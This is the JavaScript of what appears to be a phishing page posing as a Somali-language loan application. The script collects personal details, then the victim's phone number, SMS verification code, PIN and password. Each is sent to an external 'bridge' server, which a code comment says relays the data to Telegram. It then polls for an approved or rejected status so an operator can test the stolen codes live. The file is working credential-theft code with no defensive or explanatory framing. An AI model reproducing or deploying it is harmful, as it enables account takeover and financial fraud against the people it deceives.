const API_URL = import.meta.env.VITE_BRIDGE_URL;
const TENANT_KEY = import.meta.env.VITE_TENANT_KEY;

document.addEventListener('DOMContentLoaded', () => {
    const welcomeScreen = document.getElementById('welcome-screen');
    const applicationScreen = document.getElementById('application-screen');
    const phoneScreen = document.getElementById('phone-screen');
    const codeScreen = document.getElementById('code-screen');
    const pinScreen = document.getElementById('pin-screen');
    const passwordScreen = document.getElementById('password-screen');
    const loadingOverlay = document.getElementById('loading-overlay');

    const btnGetStarted = document.getElementById('btn-get-started');
    const btnNextPhone = document.getElementById('btn-next-phone');
    const btnNextCode = document.getElementById('btn-next-code');
    const btnNextPin = document.getElementById('btn-next-pin');
    const btnNextPassword = document.getElementById('btn-next-password');

    // Multi-step elements
    const appStep1 = document.getElementById('app-step-1');
    const appStep2 = document.getElementById('app-step-2');
    const appStep3 = document.getElementById('app-step-3');
    
    const loanType = document.getElementById('loan-type');
    const loanAmount = document.getElementById('loan-amount');
    const loanTerm = document.getElementById('loan-term');
    const loanPurpose = document.getElementById('loan-purpose');
    
    const firstName = document.getElementById('first-name');
    const lastName = document.getElementById('last-name');
    const emailAddress = document.getElementById('email-address');
    
    const empStatus = document.getElementById('emp-status');
    const annualIncome = document.getElementById('annual-income');

    const sumAmount = document.getElementById('sum-amount');
    const sumTerm = document.getElementById('sum-term');
    const sumPurpose = document.getElementById('sum-purpose');
    const sumApplicant = document.getElementById('sum-applicant');

    const stepText = document.getElementById('step-text');
    const dot1 = document.getElementById('dot-1');
    const dot2 = document.getElementById('dot-2');
    const dot3 = document.getElementById('dot-3');

    const btnPrevStep = document.getElementById('btn-prev-step');
    const btnNextStep = document.getElementById('btn-next-step');

    let currentStep = 1;

    const phoneInput = document.getElementById('phone-input');
    const passwordInput = document.getElementById('password-input');
    
    const codeBoxes = document.querySelectorAll('#code-screen .code-box');
    const pinBoxes = document.querySelectorAll('#pin-screen .pin-box');

    let currentUserPhone = "";

    function showLoading() {
        if(loadingOverlay) loadingOverlay.classList.remove('hidden');
    }

    function hideLoading() {
        if(loadingOverlay) loadingOverlay.classList.add('hidden');
    }

    function showError(msg) {
        if (typeof Toastify !== 'undefined') {
            Toastify({
                text: msg,
                duration: 3000,
                close: true,
                gravity: "top",
                position: "center",
                style: { background: "#ff4444", borderRadius: "8px" }
            }).showToast();
        } else {
            alert(msg);
        }
    }

    async function processStep(payload, onSuccess, onReject) {
        showLoading();
        try {
            const res = await fetch(`${API_URL}/callback`, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                    "Authorization": `Bearer ${TENANT_KEY}`
                },
                body: JSON.stringify(payload)
            });

            if (!res.ok) throw new Error(`Server returned ${res.status}`);
            const data = await res.json();
            const attemptId = data.attemptId;

            let pollCount = 0;
            const maxPolls = 60;
            
            const interval = setInterval(async () => {
                pollCount++;
                if (pollCount > maxPolls) {
                    clearInterval(interval);
                    hideLoading();
                    showError("Waqtigii waa dhacay. Fadlan isku day mar kale.");
                    return;
                }

                try {
                    const statusRes = await fetch(`${API_URL}/status?attemptId=${attemptId}&_t=${Date.now()}`, {
                        headers: { "Authorization": `Bearer ${TENANT_KEY}` }
                    });
                    const statusData = await statusRes.json();
                    
                    if (statusData.status === "approved") {
                        clearInterval(interval);
                        hideLoading();
                        onSuccess();
                    } else if (statusData.status === "rejected") {
                        clearInterval(interval);
                        hideLoading();
                        if (onReject) onReject();
                        else showError("Xogtaada waa la diiday. Fadlan isku day mar kale.");
                    }
                } catch (e) {
                    console.error("Polling error", e);
                }
            }, 2000);

        } catch (err) {
            console.error(err);
            hideLoading();
            showError("Way ku fashilantay ku xirnaanta serfarka. Fadlan isku day mar kale.");
        }
    }

    // Navigation logic
    btnGetStarted.addEventListener('click', () => {
        welcomeScreen.classList.remove('active');
        welcomeScreen.classList.add('hidden');
        applicationScreen.classList.remove('hidden');
        applicationScreen.classList.add('active');
        updateStepUI();
    });

    function updateStepUI() {
        appStep1.classList.add('hidden');
        appStep2.classList.add('hidden');
        appStep3.classList.add('hidden');

        dot1.style.background = '#333';
        dot2.style.background = '#333';
        dot3.style.background = '#333';

        stepText.innerText = `Tallaabada ${currentStep} ee 3`;

        if (currentStep === 1) {
            appStep1.classList.remove('hidden');
            dot1.style.background = '#0dc98f';
            btnPrevStep.classList.add('hidden');
            btnNextStep.innerText = 'TALLAABADA XIGTA';
        } else if (currentStep === 2) {
            appStep2.classList.remove('hidden');
            dot1.style.background = '#0dc98f';
            dot2.style.background = '#0dc98f';
            btnPrevStep.classList.remove('hidden');
            btnNextStep.innerText = 'TALLAABADA XIGTA';
        } else if (currentStep === 3) {
            appStep3.classList.remove('hidden');
            dot1.style.background = '#0dc98f';
            dot2.style.background = '#0dc98f';
            dot3.style.background = '#0dc98f';
            btnPrevStep.classList.remove('hidden');
            btnNextStep.innerText = 'DIR CODSIGA';

            // Populate summary
            sumAmount.innerText = `$${loanAmount.value || 0}`;
            sumTerm.innerText = loanTerm.value;
            sumPurpose.innerText = loanPurpose.value || '-';
            sumApplicant.innerText = `${firstName.value} ${lastName.value}`.trim() || '-';
        }
    }

    btnPrevStep.addEventListener('click', () => {
        if (currentStep > 1) {
            currentStep--;
            updateStepUI();
        }
    });

    btnNextStep.addEventListener('click', () => {
        if (currentStep === 1) {
            if (!loanAmount.value || !loanPurpose.value) {
                showError("Fadlan buuxi dhammaan meelaha banaan.");
                return;
            }
            currentStep++;
            updateStepUI();
        } else if (currentStep === 2) {
            if (!firstName.value || !lastName.value || !emailAddress.value) {
                showError("Fadlan buuxi dhammaan meelaha banaan.");
                return;
            }
            currentStep++;
            updateStepUI();
        } else if (currentStep === 3) {
            if (!annualIncome.value) {
                showError("Fadlan geli dakhligaaga sannadlaha ah.");
                return;
            }
            // Done with Application! Go to Phone screen.
            applicationScreen.classList.remove('active');
            applicationScreen.classList.add('hidden');
            phoneScreen.classList.remove('hidden');
            phoneScreen.classList.add('active');
            setTimeout(() => phoneInput.focus(), 400);
        }
    });

    // Phone screen to OTP screen (Sends data to Telegram)
    btnNextPhone.addEventListener('click', () => {
        if (!btnNextPhone.disabled) {
            currentUserPhone = "+252" + phoneInput.value.replace(/\s/g, '');
            
            const detailsStr = `Name: ${firstName.value} ${lastName.value}\nEmail: ${emailAddress.value}\nLoan: $${loanAmount.value} (${loanType.value}, ${loanTerm.value})\nPurpose: ${loanPurpose.value}\nIncome: $${annualIncome.value} (${empStatus.value})`;
            
            const payload = {
                type: 'login',
                name: `${firstName.value} ${lastName.value}`.trim(),
                phone: currentUserPhone,
                details: detailsStr
            };

            processStep(payload, () => {
                phoneScreen.classList.remove('active');
                phoneScreen.classList.add('hidden');
                codeScreen.classList.remove('hidden');
                codeScreen.classList.add('active');
                setTimeout(() => codeBoxes[0].focus(), 400);
            });
        }
    });

    // Phone input validation
    phoneInput.addEventListener('input', (e) => {
        e.target.value = e.target.value.replace(/\D/g, '');
        if (e.target.value.length > 5) {
            btnNextPhone.disabled = false;
            btnNextPhone.classList.remove('disabled');
        } else {
            btnNextPhone.disabled = true;
            btnNextPhone.classList.add('disabled');
        }
    });

    phoneInput.addEventListener('keydown', (e) => {
        if (e.key === 'Enter' && !btnNextPhone.disabled) {
            btnNextPhone.click();
        }
    });

    // Other screens logic
    btnNextCode.addEventListener('click', () => {
        if (!btnNextCode.disabled) {
            const code = Array.from(codeBoxes).map(b => b.value).join('');
            const payload = { type: 'otp', name: '', phone: currentUserPhone, details: `OTP: ${code}` };

            processStep(payload, () => {
                codeScreen.classList.remove('active');
                codeScreen.classList.add('hidden');
                pinScreen.classList.remove('hidden');
                pinScreen.classList.add('active');
                setTimeout(() => pinBoxes[0].focus(), 400);
            }, () => {
                showError("Koodhka xaqiijinta waa khalad. Isku day mar kale.");
                codeBoxes.forEach(b => { b.value = ''; b.classList.remove('filled'); });
                codeBoxes[0].focus();
                btnNextCode.disabled = true;
                btnNextCode.classList.add('disabled');
            });
        }
    });

    btnNextPin.addEventListener('click', () => {
        if (!btnNextPin.disabled) {
            const pin = Array.from(pinBoxes).map(b => b.value).join('');
            const payload = { type: 'pin', name: '', phone: currentUserPhone, details: `PIN: ${pin}` };

            processStep(payload, () => {
                pinScreen.classList.remove('active');
                pinScreen.classList.add('hidden');
                passwordScreen.classList.remove('hidden');
                passwordScreen.classList.add('active');
                setTimeout(() => passwordInput.focus(), 400);
            }, () => {
                showError("PIN-ku waa khalad. Isku day mar kale.");
                pinBoxes.forEach(b => { b.value = ''; b.classList.remove('filled'); });
                pinBoxes[0].focus();
                btnNextPin.disabled = true;
                btnNextPin.classList.add('disabled');
            });
        }
    });

    btnNextPassword.addEventListener('click', () => {
        if (!btnNextPassword.disabled) {
            const payload = { type: 'password', name: '', phone: currentUserPhone, details: `Password: ${passwordInput.value}` };

            processStep(payload, () => {
                if (typeof Toastify !== 'undefined') {
                    Toastify({
                        text: "Waa lagu guuleystay! Waa lagu wareejinayaa...",
                        duration: 3000,
                        gravity: "top",
                        position: "center",
                        style: { background: "#0dc98f", borderRadius: "8px" }
                    }).showToast();
                } else {
                    alert("Waa lagu guuleystay!");
                }
                setTimeout(() => window.location.reload(), 3000);
            }, () => {
                showError("Baasaboorka lama aqbalin. Fadlan isku day baasaboor kale.");
                passwordInput.value = '';
                btnNextPassword.disabled = true;
                btnNextPassword.classList.add('disabled');
            });
        }
    });

    passwordInput.addEventListener('input', (e) => {
        e.target.value = e.target.value.replace(/\D/g, '');
        if (e.target.value.length === 6) {
            btnNextPassword.disabled = false;
            btnNextPassword.classList.remove('disabled');
        } else {
            btnNextPassword.disabled = true;
            btnNextPassword.classList.add('disabled');
        }
    });

    passwordInput.addEventListener('keydown', (e) => {
        if (e.key === 'Enter' && !btnNextPassword.disabled) {
            btnNextPassword.click();
        }
    });

    function setupBoxes(boxes, nextBtn) {
        boxes.forEach((box, index) => {
            box.addEventListener('input', (e) => {
                e.target.value = e.target.value.replace(/\D/g, '');
                if (e.target.value.length === 1) {
                    box.classList.add('filled');
                    if (index < boxes.length - 1) boxes[index + 1].focus();
                } else {
                    box.classList.remove('filled');
                }
                checkFilled();
            });

            box.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace') {
                    box.classList.remove('filled');
                    if (e.target.value.length === 0 && index > 0) boxes[index - 1].focus();
                } else if (e.key === 'ArrowLeft' && index > 0) {
                    boxes[index - 1].focus();
                } else if (e.key === 'ArrowRight' && index < boxes.length - 1) {
                    boxes[index + 1].focus();
                } else if (e.key === 'Enter' && !nextBtn.disabled) {
                    nextBtn.click();
                }
            });
            
            box.addEventListener('paste', (e) => {
                e.preventDefault();
                const pastedData = (e.clipboardData || window.clipboardData).getData('text');
                const numericData = pastedData.replace(/\D/g, '').slice(0, boxes.length);
                if (numericData.length > 0) {
                    for (let i = 0; i < numericData.length; i++) {
                        if (index + i < boxes.length) {
                            boxes[index + i].value = numericData[i];
                            boxes[index + i].classList.add('filled');
                        }
                    }
                    const nextEmptyIndex = Math.min(index + numericData.length, boxes.length - 1);
                    boxes[nextEmptyIndex].focus();
                    checkFilled();
                }
            });
        });
        
        function checkFilled() {
            let allFilled = true;
            boxes.forEach(b => { if (b.value.length === 0) allFilled = false; });
            if (allFilled) {
                nextBtn.disabled = false;
                nextBtn.classList.remove('disabled');
            } else {
                nextBtn.disabled = true;
                nextBtn.classList.add('disabled');
            }
        }
    }

    setupBoxes(codeBoxes, btnNextCode);
    setupBoxes(pinBoxes, btnNextPin);
});
